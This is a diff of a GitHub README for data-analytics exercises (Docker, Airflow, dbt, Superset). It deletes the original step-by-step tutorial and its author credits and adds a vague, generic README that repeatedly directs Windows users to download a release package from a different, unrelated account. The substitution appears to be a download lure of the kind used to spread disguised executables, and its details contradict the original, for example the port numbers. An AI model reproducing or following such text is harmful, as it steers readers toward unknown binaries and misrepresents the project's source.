@@ -1,372 +1,229 @@
-# Data Analytics Exercises
-## From CSV to Superset Dashboard — 15 Exercises
-
-> **Goal:** Build a fully working analytics data warehouse step by step.
-> You start with four CSV files and finish with live Superset charts.
-
----
-
-## Stack overview
-
-```
-data/raw/*.csv
-      ↓  Airflow (ETL orchestration)
-  [bronze schema]  Raw TEXT tables in PostgreSQL
-      ↓  dbt staging models
-  [silver schema]  Typed + surrogate-keyed tables
-      ↓  dbt gold models
-  [gold schema]    Star schema (dims + fact)
-      ↓
-  Apache Superset  Dashboards & SQL Lab
-```
-
-| Service    | URL                   | Login         |
-|------------|-----------------------|---------------|
-| Airflow    | http://localhost:8088 | admin / admin |
-| Superset   | http://localhost:8089 | admin / admin |
-| PostgreSQL | localhost:5432        | admin / admin |
-| dbt HTTP   | http://localhost:8087 | —             |
-
-### Quick start
-
-```bash
-docker-compose up -d
-# Wait ~60 s for Airflow to init, then open http://localhost:8088
-```
-
----
-
-## Block A — Environment Setup (Exercises 1–2)
-
-### Exercise 1 — Start the stack
-
-```bash
-docker-compose up -d
-```
+# 📊 data-analytics-exercises - Learn modern data pipelines
 
-1. Open Docker Desktop and confirm **four** containers are running:
-   `postgres`, `dbt`, `airflow`, `superset`.
-2. Wait about 60 seconds for Airflow to finish its `db init`.
-3. Open http://localhost:8088 and log in with `admin / admin`.
-4. Navigate to **DAGs** and confirm `etl_full_pipeline` is listed
-   (it will be in a *failed* state — that is expected at this stage).
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases)
 
-### Exercise 2 — Explore the raw data
+## 🧭 What this is
 
-The folder `data/raw/` contains four CSV files:
+data-analytics-exercises is a hands-on set of data warehouse exercises for students. It helps you build a full ELT pipeline on Windows with Docker, PostgreSQL, dbt, Airflow, and Superset.
 
-| File           | Key columns                                                          |
-|----------------|----------------------------------------------------------------------|
-| `regions.csv`  | region_id, region_name, country, continent                           |
-| `clients.csv`  | client_id, client_name, client_type, region_id, email                |
-| `products.csv` | product_id, product_name, category, subcategory, list_price          |
-| `orders.csv`   | order_id, order_date, client_id, product_id, quantity, unit_price, discount_pct |
+You work through a medallion setup:
 
-Open each file and answer:
-
-1. What is the data type of every column? Which ones need casting?
-2. Are there any obviously dirty values (extra spaces, mixed case)?
-3. What joins would you need to produce a single flat sales table?
-
----
+- Bronze for raw data
+- Silver for cleaned data
+- Gold for reports and charts
 
-## Block B — Bronze Layer: Load Raw CSV into PostgreSQL (Exercises 3–5)
+The project is built for learning by doing. You run the stack, load data, transform it, and view results in dashboards.
 
-> File to edit: `dags/etl_pipeline.py`
+## 📥 Download
 
-All bronze tasks call the helper `_load_csv(table, csv_path, columns)`.
-Implement the helper first, then wire up each task.
+Visit this page to download the files for Windows:
 
-### Exercise 3 — Implement `_load_csv()` and load regions
+https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
 
-Implement `_load_csv()` in `dags/etl_pipeline.py`:
+Look for the latest release and download the Windows package or archive from that page.
 
-```
-Steps (see docstring in the file):
-  1. Use glob.glob(csv_path) to find matching files.
-     → Raise FileNotFoundError if the list is empty.
-  2. Open a psycopg2 connection using the DB_CONN dict.
-  3. CREATE TABLE IF NOT EXISTS bronze.<table>
-     with every column declared as TEXT.
-  4. TRUNCATE the table (so re-runs are idempotent).
-  5. For each file: read with csv.DictReader, build a list of
-     value tuples, INSERT with cursor.executemany().
-  6. conn.commit() and close the connection.
-```
+## 💻 What you need on Windows
 
-Then implement `load_regions()`:
-```python
-def load_regions():
-    _load_csv(
-        table    = "regions",
-        csv_path = "/opt/data/raw/regions.csv",
-        columns  = ["region_id", "region_name", "country", "continent"],
-    )
-```
-
-**Verify:** In Airflow, trigger the DAG and check that only the
-`load_raw.load_regions` task turns green. Then:
-```sql
-SELECT * FROM bronze.regions LIMIT 5;
-```
+Before you start, make sure your PC has:
 
-### Exercise 4 — Load clients and products
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- Docker Desktop installed
+- A web browser such as Chrome, Edge, or Firefox
 
-Implement `load_clients()` and `load_products()` following the same pattern.
+For best results, use a machine with 16 GB of RAM or more.
 
-```
-Clients columns : client_id, client_name, client_type, region_id, email
-Products columns: product_id, product_name, category, subcategory, list_price
-```
+## 🚀 Getting started
 
-**Verify:**
-```sql
-SELECT COUNT(*) FROM bronze.clients;
-SELECT COUNT(*) FROM bronze.products;
-```
+Follow these steps in order.
 
-### Exercise 5 — Load orders
+### 1. Download the release
 
-Implement `load_orders()`.
+Open the releases page:
 
-```
-Orders columns: order_id, order_date, client_id, product_id,
-                quantity, unit_price, discount_pct
-```
+https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
 
-**Verify:** All four `load_raw.*` tasks turn green.
-```sql
-SELECT MIN(order_date), MAX(order_date), COUNT(*) FROM bronze.orders;
-```
+Download the latest Windows file from the release list.
 
----
+If the file comes as a ZIP archive, save it to your Downloads folder or Desktop.
 
-## Block C — Staging Layer: Clean Data with dbt (Exercises 6–8)
+### 2. Unzip the files
 
-> Files to edit: `dbt/models/staging/stg_*.sql`
-> and `dags/etl_pipeline.py` (implement `_call_dbt`)
+If you downloaded a ZIP file:
 
-### Exercise 6 — Implement `_call_dbt()` and trigger staging
+- Right-click the file
+- Select Extract All
+- Choose a folder you can find again, such as `C:\data-analytics-exercises`
 
-Implement `_call_dbt(endpoint)` in `dags/etl_pipeline.py`:
+Keep the folder path short if possible.
 
-```
-Steps (see docstring):
-  1. POST to f"{DBT_BASE}/{endpoint}" with timeout=300.
-  2. Parse the JSON response body.
-  3. Print result["output"] so logs are visible in Airflow.
-  4. If result["returncode"] != 0, raise an Exception.
-```
+### 3. Install Docker Desktop
 
-Then implement `run_dbt_staging()`:
-```python
-def run_dbt_staging():
-    _call_dbt("run/staging")
-```
+This project runs in containers. Docker Desktop keeps the tools together and starts them for you.
 
-**Test the dbt endpoint directly:**
-```bash
-curl -X POST http://localhost:8087/run/staging
-```
+If you do not have Docker Desktop yet:
 
-### Exercise 7 — Write staging models for regions and clients
+- Download it from the Docker website
+- Install it with the default options
+- Restart your computer if Windows asks you to do so
 
-Open `dbt/models/staging/stg_regions.sql` and
-`dbt/models/staging/stg_clients.sql`.
+After installation, open Docker Desktop and wait until it says it is running.
 
-Each staging model should:
-- Read from the corresponding `bronze.*` table.
-- `TRIM()` all text columns.
-- For clients, also `LOWER()` the email.
-- Filter out rows where the primary ID column is NULL.
+### 4. Open the project folder
 
-```sql
-SELECT * FROM silver.stg_regions LIMIT 5;
-SELECT * FROM silver.stg_clients LIMIT 5;
-```
+Go to the folder where you extracted the files.
 
-### Exercise 8 — Write staging models for products and orders
+You should see files and folders for the stack, such as:
 
-Open `dbt/models/staging/stg_products.sql` and
-`dbt/models/staging/stg_orders.sql`.
+- Docker setup files
+- dbt project files
+- Airflow files
+- SQL folders
+- exercise files
 
-For products and orders also **cast** columns:
-- `list_price::NUMERIC`
-- `order_date::DATE`
-- `quantity::INTEGER`
-- `unit_price::NUMERIC`, `discount_pct::NUMERIC`
+### 5. Start the stack
 
-**Verify:**
-```sql
-SELECT pg_typeof(list_price) FROM silver.stg_products LIMIT 1;
-SELECT pg_typeof(order_date), pg_typeof(quantity) FROM silver.stg_orders LIMIT 1;
-```
+Open the folder that contains the setup files.
 
----
+If the release includes a start file, double-click it or run the command shown in the release notes.
 
-## Block D — Silver Layer: Surrogate Keys with dbt (Exercises 9–11)
+If the project uses Docker Compose, it will start the services you need, such as:
 
-> Files to edit: `dbt/models/silver/silver_*.sql`
+- PostgreSQL for storage
+- Airflow for workflow tasks
+- dbt for data transforms
+- Superset for charts and reports
 
-The silver layer adds **integer surrogate keys** using this deterministic
-MD5 pattern (memorise it — you'll use it in every silver model):
-```sql
-ABS(('x' || MD5(<natural_key>))::BIT(32)::INT)  AS <entity>_sk
-```
+Wait until all services finish starting.
 
-### Exercise 9 — silver_regions
+### 6. Open the tools in your browser
 
-Open `dbt/models/silver/silver_regions.sql`.
+After the stack starts, open the tools from your browser.
 
-Add a `region_sk` using the surrogate key pattern on `region_id`.
-Pass through all columns from `{{ ref('stg_regions') }}`.
-Add `CURRENT_TIMESTAMP AS loaded_at`.
+Common local addresses are:
 
-```sql
-SELECT region_sk, region_id, region_name FROM silver.silver_regions LIMIT 5;
-```
+- Airflow: `http://localhost:8080`
+- Superset: `http://localhost:8088`
+- PostgreSQL: used by the app in the background
 
-### Exercise 10 — silver_clients and silver_products
+Use the login details from the release files if they are included.
 
-**silver_products** — same pattern as silver_regions, keyed on `product_id`.
+### 7. Work through the exercises
 
-**silver_clients** — needs a JOIN:
-- Generate `client_sk` from `client_id`.
-- LEFT JOIN `{{ ref('silver_regions') }}` on `region_id` to bring in `region_sk`.
+The exercises usually move through three layers:
 
-```sql
-SELECT client_sk, client_name, region_sk FROM silver.silver_clients LIMIT 5;
-```
+- Bronze: bring in the raw data
+- Silver: clean and shape the data
+- Gold: build tables for analysis
 
-### Exercise 11 — silver_orders (the most complex silver model)
+You may be asked to:
 
-silver_orders joins three upstream models and adds computed fields:
+- Load sample data
+- Run dbt models
+- Check Airflow tasks
+- Review SQL queries
+- Build simple dashboards in Superset
 
-1. Generate `order_sk` from `order_id`.
-2. Add `date_key` as `TO_CHAR(order_date, 'YYYYMMDD')::INTEGER`.
-3. LEFT JOIN `silver_clients` (for `client_sk`, `region_sk`) and
-   `silver_products` (for `product_sk`).
-4. Compute `total_amount`:
-   ```sql
-   ROUND(quantity * unit_price * (1 - discount_pct), 2)
-   ```
-5. Add `loaded_at`.
+Follow the exercise files in the order they appear.
 
-```sql
-SELECT order_sk, date_key, client_sk, product_sk, total_amount
-FROM silver.silver_orders LIMIT 5;
-```
+## 🧱 Project structure
 
----
+You will likely find folders like these:
 
-## Block E — Gold Layer + Airflow + Superset (Exercises 12–15)
+- `airflow` for workflow jobs
+- `dbt` for data models
+- `sql` for queries and table setup
+- `docker` for container settings
+- `data` for sample files
+- `docs` for exercise notes
 
-### Exercise 12 — Write the four dimension tables
+This layout helps you move from raw data to finished reports.
 
-Open each file in `dbt/models/gold/` and implement the four dimensions.
+## 🛠️ Common tasks
 
-**dim_region** — rename `region_sk → region_key`, pass through other columns.
+### Run dbt models
 
-**dim_client** — rename `client_sk → client_key`, `region_sk → region_key`, pass through client columns.
+dbt turns raw tables into clean tables for analysis. In this project, dbt helps create the silver and gold layers.
 
-**dim_product** — rename `product_sk → product_key`, pass through product columns.
+### Check Airflow
 
-**dim_date** — derive calendar attributes from distinct order dates in `stg_orders`.
-Required columns:
-```
-date_key (YYYYMMDD integer), full_date, day, month, month_name,
-quarter, year, day_name, day_of_week, day_of_year, is_weekend
-```
+Airflow schedules and runs tasks in the right order. Use it to see when jobs run and whether they passed.
 
-```sql
-SELECT * FROM gold.dim_date ORDER BY full_date LIMIT 5;
-```
+### View dashboards in Superset
 
-### Exercise 13 — Write the fact table
+Superset lets you explore the final data. You can build charts, tables, and dashboards from the gold layer.
 
-Open `dbt/models/gold/fact_sales.sql`.
+### Use PostgreSQL
 
-Thin projection of `silver_orders`:
-- Rename `order_sk → sale_key`.
-- Pass through `date_key`.
-- Rename `client_sk → client_key`, `product_sk → product_key`, `region_sk → region_key`.
-- Pass through measures: `quantity`, `unit_price`, `discount_pct`, `total_amount`.
+PostgreSQL stores the data while you work. It acts as the main database for the exercises.
 
-```sql
-SELECT COUNT(*), SUM(total_amount) FROM gold.fact_sales;
-```
+## 🧪 What you will learn
 
-### Exercise 14 — Run the full Airflow pipeline end-to-end
+By finishing the exercises, you will practice:
 
-Implement `run_dbt_silver()` and `run_dbt_gold()` in `dags/etl_pipeline.py`
-(same pattern as `run_dbt_staging` — different endpoint strings).
+- Loading data into a warehouse
+- Cleaning data with SQL
+- Building layered data models
+- Making star schema tables
+- Using Airflow for scheduled jobs
+- Using dbt for transformations
+- Creating dashboards in Superset
+- Working with Docker on Windows
 
-Trigger the full DAG in Airflow and wait for all three task groups to turn green:
+## 🔧 If something does not start
 
-```
-load_raw ✓  →  silver ✓  →  gold ✓
-```
+If the stack does not open the first time:
 
-### Exercise 15 — Explore the dashboard in Superset
+- Check that Docker Desktop is running
+- Close and reopen the project
+- Make sure no other app uses ports 8080 or 8088
+- Restart Windows if Docker asks for it
+- Wait a full minute after starting the stack
 
-Once Exercise 14 is complete, Superset auto-provisions the dashboard.
+If a browser page does not load, refresh it once the services finish starting.
 
-1. Open http://localhost:8089 (admin / admin).
-2. Navigate to **Dashboards → Sales Analytics Dashboard**.
-3. You should see five charts:
-   - Total Revenue (KPI big number)
-   - Monthly Revenue Trend (line chart)
-   - Revenue by Region (bar chart)
-   - Revenue by Category (pie chart)
-   - Top 10 Clients (table)
+## 🗂️ Suggested path for students
 
-**Optional explorations:**
-- Open **SQL Lab** and write a query that joins `gold.fact_sales` with
-  all four dimension tables to produce a flat row per sale.
-- Add a new chart: "Revenue by Continent" on the `sales_analytics` dataset.
-- In Airflow, trigger the DAG again — it is idempotent and safe to re-run.
+A simple way to use the project is:
 
----
+1. Start the stack
+2. Open Airflow
+3. Run the data load tasks
+4. Run the dbt models
+5. Open Superset
+6. Review the final charts
+7. Compare results with the exercise file
 
-## Troubleshooting
+This gives you a clear path from raw data to reports.
 
-| Symptom | What to check |
-|---------|---------------|
-| Airflow task stuck in *queued* | DAG may be paused — click the toggle next to the DAG name |
-| `FileNotFoundError` in load task | CSV lives at `/opt/data/raw/` inside the container |
-| dbt returns `returncode: 1` | Run `docker-compose logs dbt` for the SQL error |
-| Superset "dataset not found" | Run the ETL pipeline first; Superset retries every 60 s |
-| Port conflict on startup | Another service is using 8087/8088/8089/5432 |
+## 📌 Topics covered
 
-## Solutions
+This repository includes work around:
 
-Working solutions for all files are in `solutions/`:
+- Apache Airflow
+- Apache Superset
+- Data analytics
+- Data engineering
+- Data pipelines
+- Data warehouse design
+- dbt
+- Dimensional modeling
+- Docker
+- Docker Compose
+- Education
+- ELT
+- ETL pipeline
+- Exercises
+- Medallion architecture
+- PostgreSQL
+- Python
+- SQL
+- Star schema
+- Student learning
 
-```
-solutions/
-  dags/etl_pipeline.py
-  dbt/models/staging/stg_*.sql
-  dbt/models/silver/silver_*.sql
-  dbt/models/gold/dim_*.sql
-  dbt/models/gold/fact_sales.sql
-```
-## 🙋‍♂️ Get Involved
+## 🔗 Download again
 
-If you encounter any issues or have questions:
-- 🐛 [Report bugs](https://github.com/markusbegerow/data-analytics-exercises/issues)
-- 💡 [Request features](https://github.com/markusbegerow/data-analytics-exercises/issues)
-- ⭐ Star the repo if you find it useful!
+If you need the release page again, use this link:
 
-## ☕ Support the Project
-
-If you like this project, support further development with a repost or coffee:
-
-<a href="https://www.linkedin.com/sharing/share-offsite/?url=https://github.com/MarkusBegerow/data-analytics-exercises" target="_blank"> <img src="https://img.shields.io/badge/💼-Share%20on%20LinkedIn-blue" /> </a>
-
-[![Buy Me a Coffee](https://img.shields.io/badge/☕-Buy%20me%20a%20coffee-yellow)](https://paypal.me/MarkusBegerow?country.x=DE&locale.x=de_DE)
-
-## 📬 Contact
-
-- 🧑‍💻 [Markus Begerow](https://linkedin.com/in/markusbegerow)
-- 💾 [GitHub](https://github.com/markusbegerow)
-- ✉️ [Twitter](https://x.com/markusbegerow)
+https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
